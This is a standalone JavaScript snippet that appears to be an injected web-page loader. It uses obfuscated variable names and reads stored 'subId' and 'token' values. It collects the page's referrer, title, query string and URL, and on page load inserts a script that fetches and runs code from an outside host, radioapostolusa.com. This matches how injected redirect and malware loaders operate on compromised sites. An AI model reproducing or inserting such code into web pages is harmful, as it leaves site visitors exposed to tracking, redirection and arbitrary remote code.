<script>
    (function() {
    var name = '_v7R224y2BHqCfzc9';
    if (!window._v7R224y2BHqCfzc9) {
        window._v7R224y2BHqCfzc9 = {
            unique: false,
            ttl: 86400,
            R_PATH: 'https://radioapostolusa.com/pJhktJ',
            P_PATH: 'https://radioapostolusa.com/79f10ac/postback',
        };
    }
    const _v5Km1gyzXmSZTvMc = localStorage.getItem('config');
    if (typeof _v5Km1gyzXmSZTvMc !== 'undefined' && _v5Km1gyzXmSZTvMc !== null) {
        var _ZH9GxsksVW5Zq4rt = JSON.parse(_v5Km1gyzXmSZTvMc);
        var _H7RGPdxmkBJwdjF7 = Math.round(+new Date()/1000);
        if (_ZH9GxsksVW5Zq4rt.created_at + window._v7R224y2BHqCfzc9.ttl < _H7RGPdxmkBJwdjF7) {
            localStorage.removeItem('subId');
            localStorage.removeItem('token');
            localStorage.removeItem('config');
        }
    }
    var _sHcXKYXtGfP1mZwZ = localStorage.getItem('subId');
    var _kZ21rX9RzQjykxkX = localStorage.getItem('token');
    var _W83bX9BFfzNbJV37 = '?return=js.client';
        _W83bX9BFfzNbJV37 += '&' + decodeURIComponent(window.location.search.replace('?', ''));
        _W83bX9BFfzNbJV37 += '&se_referrer=' + encodeURIComponent(document.referrer);
        _W83bX9BFfzNbJV37 += '&default_keyword=' + encodeURIComponent(document.title);
        _W83bX9BFfzNbJV37 += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
        _W83bX9BFfzNbJV37 += '&name=' + encodeURIComponent(name);
        _W83bX9BFfzNbJV37 += '&host=' + encodeURIComponent(window._v7R224y2BHqCfzc9.R_PATH);
    if (typeof _sHcXKYXtGfP1mZwZ !== 'undefined' && _sHcXKYXtGfP1mZwZ && window._v7R224y2BHqCfzc9.unique) {
        _W83bX9BFfzNbJV37 += '&sub_id=' + encodeURIComponent(_sHcXKYXtGfP1mZwZ);
    }
    if (typeof _kZ21rX9RzQjykxkX !== 'undefined' && _kZ21rX9RzQjykxkX && window._v7R224y2BHqCfzc9.unique) {
        _W83bX9BFfzNbJV37 += '&token=' + encodeURIComponent(_kZ21rX9RzQjykxkX);
    }
    var a = document.createElement('script');
        a.type = 'application/javascript';
        a.src = window._v7R224y2BHqCfzc9.R_PATH + _W83bX9BFfzNbJV37;
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(a, s)
    })();
    </script>
